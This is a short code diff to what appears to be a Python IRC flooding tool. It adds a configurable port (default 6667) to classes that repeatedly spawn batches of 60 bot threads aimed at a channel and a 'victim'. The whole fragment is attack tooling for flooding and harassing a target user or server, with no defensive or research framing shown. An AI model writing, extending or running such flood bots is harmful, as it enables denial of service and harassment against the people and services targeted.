@@ -115,24 +115,26 @@ class Guesser_Flooder_Thread(threading.Thread):
     dest=""
     chn=""
     victim=""
-    def __init__(self,dest,chn,victim):
+    port=6667
+    def __init__(self,dest,chn,victim,port):
      super(Guesser_Flooder_Thread, self).__init__()
      self.dest=dest
      self.chn=chn
      self.victim=victim
+     self.port=port
      pass
     def run(self):
         print("Thread of flooder init")
-        bot = guesser(self.dest, self.chn, self.victim)
+        bot = guesser(self.dest, self.chn, self.victim,port=self.port)
         pass
 
 class Guesser_Flooder:
     threads=[]
-    def __init__(self,dest,chn,victim,count=60,pause_bot=5):
+    def __init__(self,dest,chn,victim,count=60,pause_bot=5,port=6667):
      while True:
        for i in range(0,count):
          print("Add thread of bot")
-         self.threads.append(Guesser_Flooder_Thread(dest,chn,victim))
+         self.threads.append(Guesser_Flooder_Thread(dest,chn,victim,port=port))
 
        for bot in self.threads:
          bot.start()
